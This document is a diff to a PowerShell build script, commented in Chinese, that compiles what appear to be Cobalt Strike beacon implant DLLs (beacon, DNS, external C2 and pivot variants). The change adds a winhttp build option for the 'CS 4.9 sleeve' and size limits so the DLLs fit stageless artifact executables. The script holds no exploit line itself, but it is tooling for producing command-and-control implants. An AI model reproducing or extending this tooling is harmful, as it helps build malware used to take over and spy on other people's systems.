@@ -25,7 +25,11 @@ param(
     [string]$SDK,
 
     # 额外传给 MSBuild 的属性（如 /p:CSOptimized=MinSpace）
-    [string[]]$ExtraProperties = @()
+    [string[]]$ExtraProperties = @(),
+
+    # wininet (default, beacon.x64.dll) | winhttp (winhttpb.x64.dll, CS 4.9 sleeve)
+    [ValidateSet('wininet','winhttp')]
+    [string]$HttpLibrary = 'wininet'
 )
 
 $ErrorActionPreference = 'Stop'
@@ -52,6 +56,7 @@ if (-not $msbuild) { throw 'MSBuild not found - is Visual Studio 2019/2022 (with
 $props = @('/p:Configuration=Release', '/p:Platform=x64', '/p:CSOptimized=MinSpace')
 if ($Toolset) { $props += "/p:BeaconToolset=$Toolset" }
 if ($SDK)     { $props += "/p:BeaconSDK=$SDK" }
+if ($HttpLibrary -eq 'winhttp') { $props += '/p:BeaconHttpLibrary=winhttp' }
 foreach ($p in $ExtraProperties) {
     $props += if ($p.StartsWith('/p:')) { $p } else { "/p:$p" }
 }
@@ -59,18 +64,20 @@ foreach ($p in $ExtraProperties) {
 $projects = if ($Project -eq 'all') { @('beacon','dnsb','extc2','pivot') } else { @($Project) }
 
 # stageless 硬上限：artifact64big.exe .data RawSize(0x42600) - 20B 头
-$ceil = 271852
+# winhttpb.x64.dll TS sleeve 明文上限 309248（编码 309280-32）
+$ceil = if ($HttpLibrary -eq 'winhttp') { 309248 } else { 271852 }
 
 $results = @()
 foreach ($name in $projects) {
     $vcxproj = Join-Path $root "$name.vcxproj"
     if (-not (Test-Path $vcxproj)) { throw "vcxproj not found: $vcxproj" }
 
-    Write-Host "==> Building $name (x64 Release, MinSpace)" -ForegroundColor Cyan
+    Write-Host "==> Building $name (x64 Release, MinSpace, http=$HttpLibrary)" -ForegroundColor Cyan
     & $msbuild $vcxproj /t:Rebuild /nologo /v:m /m:1 @props
     if ($LASTEXITCODE -ne 0) { throw "MSBuild failed for $name (exit $LASTEXITCODE)" }
 
-    $dll = Join-Path $root "x64\Release\$name.x64.dll"
+    $dllName = if ($HttpLibrary -eq 'winhttp' -and $name -eq 'beacon') { 'winhttpb.x64.dll' } else { "$name.x64.dll" }
+    $dll = Join-Path $root "x64\Release\$dllName"
     if (-not (Test-Path $dll)) { throw "Build reported success but DLL not found: $dll" }
     $bytes = (Get-Item $dll).Length
     $results += [pscustomobject]@{
@@ -78,7 +85,7 @@ foreach ($name in $projects) {
         Dll       = $dll
         Bytes     = $bytes
         Stageless = if ($bytes -le $ceil) { "OK (+$($ceil - $bytes))" } else { "OVER (-$($bytes - $ceil))" }
-        Map       = (Test-Path (Join-Path $root "x64\Release\$name.x64.map"))
+        Map       = (Test-Path ([IO.Path]::ChangeExtension($dll, '.map')))
     }
 }
 
